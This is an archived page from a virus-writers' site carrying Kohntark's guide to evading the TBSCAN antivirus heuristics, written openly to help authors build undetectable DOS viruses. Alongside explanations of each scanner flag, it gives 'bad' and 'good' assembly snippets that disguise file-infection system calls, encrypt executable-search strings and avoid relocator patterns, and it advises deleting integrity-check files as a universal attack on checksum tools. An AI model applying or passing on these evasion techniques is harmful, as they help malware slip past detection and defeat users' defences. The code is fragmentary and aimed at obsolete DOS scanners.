<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> Kohntark 'A guide to Anti-Heuristics / Shmistics Technology' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="Kohntark"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Kohntark,guide to Anti-Heuristics / Shmistics Technology, heuristics, invalid, offset, flags, resident, search, point, stamp, flag, entry, word, unknown, program, sector, boot"/>
<meta name="Description" content="VX Heaven site is dedicted to providing information about computer viruses (virii) and web space for virus authors and groups"/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"359eae3985495b817fde4b0e5530ebc4065ed8b6-1498756352-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vkh01.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>A guide to Anti-Heuristics / Shmistics Technology</h1><p><a href="/lib/?lang=en&amp;author=Kohntark"> Kohntark</a><br/></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vkh01.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=AA#vkh01">Back to index</a>] [<a href="/lib/vkh01.html#disqus_thread">Comments</a>]<br/> 
<h2>INTRO</h2>
<p>Dear Reader:</p>
<p>If you have been following the Virus / Anti-virus scene you might have stumbled upon the word "Heuristics." Heuristics is a term commonly used in artificial intelligence programs (Expert Systems etc.).</p>
<p>So what does artificial intelligence have to do with software that is not even able to catch a Vienna.Grandma.Variant.#100 virus (CARO Name?) created by a 15 year old in his spare time?</p>
<p>Well, it seems that the AV marketing strategists are running out of new technologies to sell to the ever hi-new-vapor-tech hungry public and have decided to add artificial intelligence to the latest Antiviral software bag of tricks.</p>
<p>But how intelligent these "heuristics" programs really are? Is it just another vain marketing trick or is the sunrise of artificial intelligence upon us? Can we really have intelligent programs created by fools and demented megalomaniacs?</p>
<p>I claim that heuristics AV programs are not intelligent at all and I will prove.</p>
<p>First, please enter Thunderbyte Anti-Virus (TBAV), the dutch software shareware package that has become an underground favourite due to its liberal use of the word "heuristics" and to above average good quality.</p>
<p>TBSCAN, TBAV's scanner is an incredibly fast program that usually identifies a high percentage of new and unknown viruses. TBSCAN is the most reliable scanner to discover the not-yet-named ditties created all around the world.</p>
<p>Until Now.</p>
<p>Enter Kohntark's "Heuristics / Shmistics guide." This informative program will show you how TBSCAN really works, how to ridicule this program, and to beat it flag by flag (you can think of flags as Heuristics warnings.)</p>
<p>Now you can be the first one in your block to write anti-heuristics / Shmistics viruses!</p>
<p>The process is incredibly simple: For each Flag or heuristic warning I have listed a BAD CODE (Example of evil, ugly code that causes heuristics flags to go off.) and GOOD CODE (Example of Good, Anti-Heuristics code.)</p>
<p>All you have to do when you have a virus that raises specific flags in TBSCAN is:</p>
<ol>
<li>Look up the specific Flag in the Heuristics / Shmistics guide</li>
<li>Look at the DON'T code (which corresponds more or less to your code)</li>
<li>Study the solution in the DO part.</li>
<li>Adapt the solution to your particular code.</li>
</ol>
<p>And voila!, viruses free of shmistics!</p>
<p>With this program I have included 2 BIG examples:</p>
<p>A GOOD example, the first virus this side of the galaxy not to raise ANY heuristics flags when scanned by TBSCAN.</p>
<p>An EVIL example: a donothing file that, as you might have guessed does not do anything, and raises more heuristics flags than any virus known to mankind.</p>
<p>I hope this information is enough to span the next generation of anti-heuristic / shmistic viruses, to inspire virus programmers worldwide to write and modify the trillions of viruses used as currency by some people, and to force the AV marketing strategists to come up with better ideas next time.</p>
<p>(Shall I mention that Thunderbyte will have to rewrite its scanner?)</p>
<pre>
				enjoy!
				Kohntark
</pre>
<h2>TBAV Terminology</h2>
<ol>
<li>Looking</li>
<li>Checking</li>
<li>Tracing</li>
<li>Scanning</li>
<li>Skipping</li>
<li>Go to TBAV Flags</li>
</ol>
<p><strong>"Looking"</strong> means that TbScan has successfully located the entry point of the program in one step. The program code has been identified so TbScan knows where to search without the need of additional analysis.</p>
<p>Looking will be used on most files produced by known software.</p>
<p><strong>"Checking"</strong> means that TbScan has successfully located the entry point of the program, and is scanning a frame of about 4Kb around the entry point. If the file is infected the signature of the virus will be in this area. "Checking" is a very fast and reliable scan algorithm.</p>
<p>Checking will be used on most files that are not produced by known software.</p>
<p><strong>"Tracing"</strong> means that TbScan has successfully traced a chain of jumps or calls while locating the entry-point of the program, and is scanning a frame of about 4Kb around this location. If the file has been infected, the signature of the virus will be in this area. "Tracing" is a fast and reliable scan algorithm.</p>
<p>Tracing will be primarily used for TSR-type COM files or Turbo Pascal-compiled programs. Most viruses will force TbScan to use "Tracing".</p>
<p><strong>"Scanning"</strong> means that TbScan is scanning the entire file (except for the exe-header which cannot contain any viral code). This algorithm will be used if "Looking", "Checking" or "Tracing" cannot be safely used. This is the case when the entry-point of the program contains other jumps and calls to code located outside the scanning frame, or when the heuristic analyzer found something that should be investigated more thoroughly. "Scanning" is a slow algorithm. Because it processes almost the entire file, including data areas, false alarms are more likely to occur.</p>
<p>The "Scanning" algorithm will be used while scanning bootsectors, SYS and BIN files.</p>
<p><strong>"Skipping"</strong> will occur with SYS and OVL files only. It simply means that the file will not be scanned. As there are many SYS files that contain no code at all (like CONFIG.SYS) it makes absolutely no sense to scan these files for viruses. The same applies to .OV? files. Many overlay files do not deserve to be called as such as they lack an exe-header. Such files cannot be invoked through DOS making them just as invulnerable to direct virus attacks as .TXT files are. If a virus is reported to have infected an .OV? file, it involved one of the relatively few overlay files that does contain an exe-header. The infection was then the result of the virus monitoring the DOS exec-call (function 4Bh) and infecting any program being invoked that way, including "real" overlay files.</p>
<table border="1" cellspacing="0" cellpadding="0" summary="TBAV flags">
<tr><th colspan="2">TBAV Flags</th></tr>
<tr><td>#</td><td>Decryptor code found</td></tr>
<tr><td>!</td><td>Invalid program.</td></tr>
<tr><td>1</td><td>80186+ instructions.</td></tr>
<tr><td>@</td><td>Strange instructions</td></tr>
<tr><td>?</td><td>Inconsistent header.</td></tr>
<tr><td>c</td><td>No integrity check</td></tr>
<tr><td>h</td><td>Hidden or System file.</td></tr>
<tr><td>i</td><td>Internal overlay.</td></tr>
<tr><td>p</td><td>Packed or compressed file.</td></tr>
<tr><td>w</td><td>Windows or OS/2 header.</td></tr>
<tr><td>A</td><td>Suspicious Memory Allocation</td></tr>
<tr><td>B</td><td>Back to entry.</td></tr>
<tr><td>C</td><td>File has been changed</td></tr>
<tr><td>D</td><td>Direct disk access</td></tr>
<tr><td>E</td><td>Flexible Entry-point</td></tr>
<tr><td>F</td><td>Suspicious file access</td></tr>
<tr><td>G</td><td>Garbage instructions.</td></tr>
<tr><td>J</td><td>Suspicious jump construct.</td></tr>
<tr><td>K</td><td>Unusual stack.</td></tr>
<tr><td>L</td><td>Program load trap</td></tr>
<tr><td>M</td><td>Memory resident code.</td></tr>
<tr><td>N</td><td>Wrong name extension.</td></tr>
<tr><td>O</td><td>code Overwrite.</td></tr>
<tr><td>R</td><td>Suspicious relocator</td></tr>
<tr><td>S</td><td>Search for executables</td></tr>
<tr><td>T</td><td>Invalid timestamp.</td></tr>
<tr><td>U</td><td>Undocumented system call.</td></tr>
<tr><td>V</td><td>Validated program</td></tr>
<tr><td>Y</td><td>Invalid boot sector.</td></tr>
<tr><td>Z</td><td>EXE/COM determinator.</td></tr>
</table>
<h3># - Decryptor code found.</h3>
<p>The file possibly contains a self-decryption routine. Some copy-protected software is encrypted so this warning may appear for some of your files. But if this warning appears in combination with, for example, the "T" (invalid time stamp) warning, there could be a virus involved and TbScan assumes the file is contaminated! Many viruses encrypt themselves and cause this warning to be displayed.</p>
<h4>BAD_CODE</h4>
<p>TBSCAN will trace right thru the most complicated encryption routines.. for polymorphic viruses this flag will be set most of the times.. including MTE and most TPE.. The more complex the routines are the more chances your virus has of setting other flags such as the G (Garbage code) flag.</p>
<h4>GOOD_CODE</h4>
<p>The trick here is to use dumb encryption routines, the kind the virus-guide writers hate.. why? because they are common in commercial and shareware software programs and they are non-suspicious looking. The main drawback with "Heuristics" Scanning is the possible number of false positives, and using commonly used encryption routines makes things worse.</p>
<p>This is why self appointed AV "researchers" had a hard time coming up with reliable detection methods for Trident's Polymorphic Engine, since it generates a lot of commonly found decryptors/encryptors. Also I must note that there is a couple of extremely esoteric encryption routines that will not be recognized by TBSCAN as encryptions at all!</p>
<h3>! - Invalid program.</h3>
<p>Invalid opcode (non-8088 instructions) or out-of-range branch. The program has either an entry point that located outside the body of the file, or reveals a chain of jumps that can be traced to a location outside the program file. Another possibility is that the program contains invalid processor instructions. The program being checked is probably damaged and cannot execute in most cases. At any rate, TbScan avoids risk and uses the scan method to scan the file.</p>
<h3>1 - 80186+ instructions.</h3>
<p>The file contains instructions which cannot be executed by 8088 processors, and require an 80186 or better processor.</p>
<h3>@ - Strange instructions</h3>
<p>The file contains instructions which are not likely to be generated by an assembler, but by some code generator like a polymorphic virus instead.</p>
<h3>? - Inconsistent header.</h3>
<p>The program being processed has an EXE-header that does not reflect the actual program lay-out. Many viruses do not update the EXE-header of an EXE file correctly after they infect the file, so if this warning pops up frequently, it appears you have a problem.</p>
<h3>h - Hidden or System file.</h3>
<p>The file has the Hidden or the System file attribute set. This means that the file is not visible in a DOS directory display but TbScan scans it anyway. If you don t know the origin and/or purpose of this file, you might be dealing with a Trojan Horse or a joke virus program. Copy such a file onto a diskette, remove it from its program environment, and then check if the program concerned is missing the file. If a program does not miss it, you not only have freed some disk space, but you might also have prevented a future disaster.</p>
<h3>i - Internal overlay.</h3>
<p>The program being processed has additional data or code behind the load-module as specified in the EXE-header of the file. The program might have internal overlay(s) or configuration or debug information appended behind the load-module of the EXE file.</p>
<h3>p - Packed or compressed file.</h3>
<p>This means that the program is packed or compressed. There are some utilities that can compress program files, such as EXEPACK and PKLITE. If the file became infected after compression, TbScan is able to detect the virus. However, if the file became infected before compression, the virus was also compressed in the process, and a virus scanner might no longer be able to recognize the virus. Fortunately, this does not happen very often, but you should still beware! A new program might look clean, but can turn out to be the carrier of a compressed virus. Other files in your system will become infected too, and it is these infections that will be clearly visible to virus scanners.</p>
<h3>w - Windows or OS/2 header.</h3>
<p>The program can be or is intended to run in a Windows (or OS/2) environment. TbScan offers a specialized scanning method for these files.</p>
<h3>C - File has been changed</h3>
<p>This warning appears only if you use TbSetup to generate the ANTI-VIR.DAT files and means the file has been changed. Upgrading the software would trigger this message. Otherwise, it is very likely that a virus infected the file!</p>
<p><strong>NOTE:</strong> TbScan does not display this warning if only some internal configuration area of the file changes. This warning means that code at the program entry point, the entry-point itself, and/or the file size has been changed.</p>
<h4>GOOD_CODE</h4>
<p>The only way to avoid this is to delete or modify the Anti-Vir.Dat file in each directory where you are infecting files to. The easiest method is to delete the file, to overwrite or truncate it, so it cannot be undeleted by a "smart" user. For perfect "stealth" one could modify the contents of the file, putting the right flag in the file-to-be-infected field describing it as a "self-modifying" file. This is more involved and requires unnecessary code, since the deleting of checksum files can be implemented as a universal attack against several integrity checking programs, not just TBSCAN.</p>
<h3>c - No integrity check.</h3>
<p>This warning indicates that no checksum/recovery information has been found about the indicated file. It is highly recommended to use TbSetup in this case to store information of the mentioned file. This info can later be used for integrity checking and to recover from virus infections.</p>
<h4>GOOD_CODE</h4>
<p>This is not really a flag... it won't raise any warnings by itself.. This only means that the file ANTI-VIR.DAT wasn't found in the current directory you are scanning.. this is good news of course, as TBSCAN cannot verify any checksum information for the files...</p>
<h3>F - Suspicious file access.</h3>
<p>TbScan has found instruction sequences common to infection schemes used by viruses. This flag will appear with those programs that are able to create or modify existing files.</p>
<h4>BAD_CODE</h4>
<pre class="source">
;Restore date and time of file to be infected

mov ax,5701h
mov dx,WORD PTR [si + OFFSET F_DATE - OFFSET VIRUS]
mov cx,WORD PTR [si + OFFSET F_TIME - OFFSET VIRUS]
int 21h

;Restore file attributes

lea dx,[si + FNAME - OFFSET VIRUS] ;get filename
mov cx,[si + ATTR - OFFSET VIRUS] ;get old attributes
mov ax,4301h ;set file attributes to cx
int 21h
</pre>
<h4>GOOD_CODE</h4>
<pre class="source">
;Restore date and time of file to be infected

mov ax,0A8FEh
mov dx,WORD PTR [si + F_DATE - OFFSET VIRUS]
mov cx,WORD PTR [si + F_TIME - OFFSET VIRUS]
not ax ;A8FE becomes 5701
int 21h

;Restore file attributes

lea dx,[si + OFFSET FNAME - OFFSET VIRUS] ;get filename
mov cx,[si + OFFSET ATTR - OFFSET VIRUS] ;get old attributes
mov ax,0BCFEh
not ax ;BCFE becomes 4301h
int 21h
</pre>
<p>There is a million different ways of doing this, this is just an example</p>
<h3>R - Suspicious relocator.</h3>
<p>Flag "R" refers to a suspicious relocator. A relocator is a sequence of instructions that changes the proportion of CS:IP. It is often used by viruses, especially COM type infectors. Tests on a large collection of viruses show that TbScan issues this flag for about 65% of all viruses. Those viruses have to relocate the CS:IP proportion because they have been compiled for a specific location in the executable file; a virus that infects another program can hardly ever use its original location in the file as it is appended to this file. Sound programs "know" their location in the executable file, so they don't have to relocate themselves. On systems that operate normally only a small percentage of the programs should therefore cause this flag to be displayed.</p>
<h4>BAD_CODE</h4>
<pre class="source">
;*****************
; 1-OPEN FILE
;*****************

lea dx,[si + OFFSET FNAME - OFFSET VIRUS]	;open the file
mov ax,3D02h					;r/w access to it
int 21h
jc NO_GOOD					;error.. quit
xchg ax,bx					;bx = file handle
</pre>
<p>Where do you think the problem is? Well, you might have read in clumsy virus writing guides of the joys of using indexed instructions to access the virus' data locations in memory to make your code fast and small. The "experts" use them even in their soup and it makes their code tight. Well, do you want tight code that can be recognized as a virus from miles away or you want real, undetectable viruses? If you chose the later do yourself a favour.. minimize the use of indexes. TBSCAN will set the R flag with just a few of them anywhere in your code.</p>
<h4>GOOD_CODE</h4>
<pre class="source">
mov bp,si					;flabby, fat code
add bp,OFFSET FNAME - OFFSET VIRUS		;but it unsuspicious!
mov dx,bp

mov ax,3D02h					;r/w access to it
int 21h
jc NO_GOOD					;error.. quit
xchg ax,bx					;bx = file handle
</pre>
<p>You can apply the same solution for any code that can be indexed:</p>
<pre class="source">
mov WORD PTR [si + ATTR - VIRUS],cx		;save attributes
cmp BYTE PTR [si + START_CODE+3 - VIRUS],20h	;check for " "
add WORD PTR [si + LOC - VIRUS],cx
sub WORD PTR [si + LOC1 - VIRUS],dx
etc..
</pre>
<p>The strategy is the same.. it might add a lot of "fat" to your code, but a fat virus is better than a dead one.</p>
<h3>N - Wrong name extension.</h3>
<p>Name conflict. The program carries the extension .EXE but appears to be an ordinary .COM file, or it has the extension .COM but the internal layout of an .EXE file. TbScan does not take any risk in this situation, but scans the file for both EXE and COM type signatures. A wrong name extension might in some cases indicate a virus, but in most cases it doesn't.</p>
<h4>BAD_CODE</h4>
<p>This will occur in extremely buggy viruses that cannot distinguish EXE files from COMs or in stupid overwriting viruses. There is also a couple of DOS 5.0 files, specifically DISK.COM that have a EXE header, so special care must be taken in not raising extra flags since any possible host may have heuristic flags of its own, so any heuristic flags added by the virus will just make the file more suspicious.</p>
<h3>S - Search for executables.</h3>
<p>The program searches for *.COM or *.EXE files. This by itself does not indicate a virus, but it is an ingredient of most viruses anyway (they have to search for suitable files to spread themselves). If accompanied by other flags, TbScan will assume the file is infected by a virus.</p>
<h4>BAD_CODE</h4>
<p>The following code (even by itself!) is enough to set this flag:</p>
<pre class="source">
	db '*.COM'
	db '*.EXE'
</pre>
<h4>GOOD_CODE</h4>
<p>To get around this use what I call "point-encryption routine" to make the strings into something not recognizable.. (Also, see the Z flag)</p>
<pre class="source">
mov bp,OFFSET COM_FILES				;decrypt *.COM string
call POINT_ENCRYPT
add bp,02
call POINT_ENCRYPT

lea dx,[si + OFFSET COM_FILES - OFFSET VIRUS ]	;dont use this..
;see R flag
mov ax,04E00h					;mov ah,4eh, => DOS search 1st file function
mov cx,3fh					;search for any file, with any attributes
int 21H
etc..
</pre>
<h4>POINT_ENCRYPT</h4>
<pre class="source">
push bp						;save bp to do dword encryptions
etc.

add bp,si
sub bp,OFFSET VIRUS				;the entry point of the virus is on si
xor WORD PTR [bp],ID2
pop bp						;restore bp
ret						;return to caller

COM_FILES
db 5Dh,59h,34h,38h,'M',0			;encrypted *.COM,0

ID2 equ 7777h					;(used in POINT_ENCRYPT)
</pre>
<p>This is just one (and rather inefficient) way of doing this... there are a million other ways... this is just to give you an idea. For a more efficient way look in the example virus.</p>
<h3>A - Suspicious Memory Allocation</h3>
<p>The program uses a non-standard way to search for, and/or to allocate memory. Many viruses try to hide themselves in memory, so they use a non-standard way to allocate this memory. Some programs (such as high-loaders or diagnostic software) also use non-standard ways to search or allocate memory.</p>
<h3>B - Back to entry.</h3>
<p>The program seems to execute some code, and after that jumps back to the entry-point of the program. Normally this results in an endless loop, except when the program also modifies some of its instructions. This is quite common behavior for computer viruses. In combination with any other flag, TbScan reports a virus.</p>
<h3>D - Direct disk access</h3>
<p>This flag appears if the program being processed has instructions near the entry-point to write to a disk directly. It is quite normal that some disk related utilities trigger this flag. If several files that should not be writing directly to the disk trigger this flag, your system might be infected by an unknown virus.</p>
<p><strong>NOTE:</strong> A program that accesses the disk directly does not always have the "D" flag. Only when the direct disk instructions are near the program entry point does TbScan report it. If a virus is at fault, the harmful instructions are always near the entry point, so it is only there that TbScan looks for them.</p>
<h3>E - Flexible Entry-point</h3>
<p>This flag indicates that the program starts with a routine that determines its location within the program file. This is rather suspicious because sound programs have a fixed entry-point so they do not have to determine this location. For viruses, however, this is quite common. Approximately 50% of the known viruses trigger this flag.</p>
<h3>G - Garbage instructions.</h3>
<p>The program contains code that seems to have no purpose other than encryption or avoiding recognition by virus scanners. In most cases there won't be any other flag since the file is encrypted and the instructions are hidden.</p>
<p><strong>NOTE:</strong> This flag appears occasionally on "normal" files. This simply indicates, however, that these are poorly designed, not infected..</p>
<h3>J - Suspicious jump construct.</h3>
<p>The program did not start at the program entry point. The code has either jumped at least twice before reaching the final startup code, or the program jumped using an indirect operand. Sound programs should not display this kind of strange behavior. If several files trigger this flag, you should investigate your system thoroughly.</p>
<h3>K - Unusual stack.</h3>
<p>The EXE file being processed has an odd (instead of even) stack offset or a suspicious stack segment. Many viruses are quite buggy by setting up an illegal stack value.</p>
<h3>L - Program load trap</h3>
<p>The program might trap the execution of other software. If the file also triggers the "M" flag (memory resident code), it is very likely that the file is a resident program that determines when another program executes. Many viruses trap the program load and use it to infect the program. Some anti-virus utilities also trap the program load.</p>
<h3>M - Memory resident code.</h3>
<p>TbScan has found instruction sequences that could cause the program to hook into important interrupts. Many TSR (Terminate and Stay Resident) programs trigger this flag because hooking into interrupts is part of their usual behavior. If several non-TSR programs trigger this warning flag, however, you should be suspicious. It is likely that a virus that remains resident in memory infected your files.</p>
<p><strong>NOTE:</strong> This warning does not appear with all true TSR programs, nor can you always rely upon TSR detection in non-TSR programs.</p>
<h3>O - code Overwrite.</h3>
<p>This flag appears if TbScan detects that the program overwrites some of its instructions. However, it does not seem to have a complete (de)cryptor routine.</p>
<h3>T - Invalid timestamp.</h3>
<p>The timestamp of the program is invalid; that is, the number of seconds in the time stamp is illegal, or the date is illegal or later than the year 2000. This is suspicious because many viruses set the time stamp to an illegal value (such as 62 seconds) to mark that they already infected the file so they won't infect a file a second time. It is possible that the program being checked is contaminated with a virus that is still unknown, especially if several files on your system have an invalid time stamp. If only very few programs have an invalid time stamp, you d better correct it and scan frequently to check that the time stamp of the files remains valid.</p>
<h3>U - Undocumented system call.</h3>
<p>The program uses unknown DOS calls or interrupts. These unknown calls can be issued to invoke undocumented DOS features, or to communicate with an unknown driver in memory. Since many viruses use undocumented DOS features, or communicate with memory resident parts of a previously loaded instance of the virus, a program is suspicious if it performs unknown or undocumented communications. This does not necessarily indicate a virus, however, since some tricky programs also use undocumented features.</p>
<h3>V - Validated program</h3>
<p>The program has been validated to avoid false alarms. The design of this program would normally cause a false alarm by the heuristic scan mode of TbScan, or this program might change frequently, and TbScan excludes the file from integrity checking. Either TbSetup (automatically) or by TbScan (manually) stores these exclusions in the ANTI-VIR.DAT.</p>
<h3>Y - Invalid boot sector.</h3>
<p>The boot sector is not completely according to the IBM defined boot sector format. It is possible that the boot sector contains a virus or has been corrupted.</p>
<h3>Z - EXE/COM determinator.</h3>
<p>The program seems to check whether a file is a COM or EXE type program. Infecting a COM file is a process that is not similar to infecting an EXE file, which implies that viruses able to infect both program types should also be able to distinguish between them. There are, of course, innocent programs that need to find out whether a file is a COM or EXE file. Executable file compressors, EXE2COM, converters, debuggers, and high-loaders are examples of programs that might contain a routine to distinguish between EXE and COM files.</p>
[<a style="" href="/lib/?lang=EN&amp;index=AA#vkh01">Back to index</a>] [<a href="/lib/vkh01.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vkh01">de</a><a href="/lib/index.php?lang=en&amp;id=vkh01">en</a><a href="/lib/index.php?lang=es&amp;id=vkh01">es</a><a href="/lib/index.php?lang=it&amp;id=vkh01">it</a><a href="/lib/index.php?lang=fr&amp;id=vkh01">fr</a><a href="/lib/index.php?lang=pl&amp;id=vkh01">pl</a><a href="/lib/index.php?lang=ru&amp;id=vkh01">ru</a><a href="/lib/index.php?lang=ua&amp;id=vkh01">ua</a></div>
</body>
</html>
